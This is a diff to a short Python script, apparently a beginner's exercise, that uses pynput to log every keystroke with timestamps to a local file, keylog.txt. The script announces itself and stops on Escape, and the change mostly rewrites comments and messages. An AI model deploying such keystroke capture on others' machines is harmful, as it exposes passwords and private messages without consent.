@@ -1,44 +1,63 @@
-# first we will get started with keylogger module
-# importing the required modules
+# Import the required modules
+from pynput import keyboard  # For monitoring keyboard
+import logging              # For saving data to files
 
-from pynput import keyboard
-import logging
+# Configure logging to save keystrokes to a file
+logging.basicConfig(
+    filename="keylog.txt",                    # Save to this file
+    level=logging.DEBUG,                      # Log all message types
+    format='%(asctime)s: %(message)s'        # Include timestamp in logs
+)
 
-# next up we will set up logging configurations
-'''
-so here the logging.basicConfig sets up the configuration for logging
-then logging.debug means it will now records all the keystrokes in the filename as keylog.txt 
-and the format says that it will also store the time of the keystroke
-
-'''
-logging.basicConfig(filename="keylog.txt",level=logging.DEBUG, format='%(asctime)s:%(message)s')
-
-
-# now creating a keypress function
 def on_press(key):
-    """Function called when a key is pressed"""
+    """This function runs every time a key is pressed"""
     try:
-        # Regular character keys
-        logging.info(f'Key {key.char} pressed')             # this function logging info gets the keypressed
-                                                            #  and then we are printing that key 
-        print(f'Key {key.char} pressed')
+        # Try to get the character representation of the key
+        character = key.char
+        
+        # Log the character to file
+        logging.info(f'Character pressed: {character}')
+        
+        # Also display it on screen
+        print(f'You pressed: {character}')
+        
     except AttributeError:
-        # Special keys (ctrl, alt, space, etc.)
-        # This catches errors that happen when the key doesn't have a .char attribute (like special keys)
-        logging.info(f'Special key {key} pressed')
-        print(f'Special key {key} pressed')
-
+        # This happens when the key doesn't have a character (like Ctrl, Alt, etc.)
+        
+        # Log the special key to file
+        logging.info(f'Special key pressed: {key}')
+        
+        # Display it on screen
+        print(f'Special key pressed: {key}')
 
 def on_release(key):
-    """Function called when a key is released"""
-    if key == keyboard.Key.esc:         # This checks if the released key is the Escape key
-        # Stop listener when Escape is pressed
-        print("Escape pressed - stopping keylogger")
+    """This function runs every time a key is released"""
+    
+    # Check if the released key is the Escape key
+    if key == keyboard.Key.esc:
+        print("Escape key detected - stopping keylogger")
+        
+        # Log that the keylogger is stopping
+        logging.info("Keylogger stopped by user")
+        
+        # Return False to stop the listener
         return False
 
-print("Keylogger started. Press Escape to stop.")
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+# Main program starts here
+print("=== Simple Keylogger ===")
+print("Starting keylogger...")
+print("All keystrokes will be saved to 'keylog.txt'")
+print("Press Escape to stop the keylogger")
+print("-" * 40)
+
+# Create and start the keyboard listener
+with keyboard.Listener(
+    on_press=on_press,      # Function to call when key is pressed
+    on_release=on_release   # Function to call when key is released
+) as listener:
+    # Start listening for keyboard events
     listener.join()
 
-
-
+# This runs after the listener stops
+print("Keylogger stopped successfully!")
+print("Check 'keylog.txt' file to see captured keystrokes")
